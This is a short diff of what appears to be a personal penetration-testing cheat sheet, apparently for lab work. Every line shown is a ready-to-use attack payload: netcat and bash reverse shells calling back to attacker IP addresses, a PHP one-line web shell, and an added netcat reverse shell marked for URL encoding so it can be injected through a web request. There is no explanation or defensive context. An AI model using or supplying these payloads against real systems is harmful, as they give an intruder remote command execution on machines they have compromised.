@@ -8,7 +8,7 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp
 cat user_backups.sh
 "bash -c 'bash -i >& /dev/tcp/192.168.49.121/443 0>&1'"
 bash -c 'bash -i >& /dev/tcp/192.168.49.121/443 0>&1'
-
+rm /tmp/f;mkfifo /tmp/f ;cat /tmp/f|/bin/sh -i 2>&1 |nc 192.168.118.4 8080  >/tmp/f --> URL Encode
 
 #PHP Reverse Shells
 <?php system($_GET['cmd']);?>
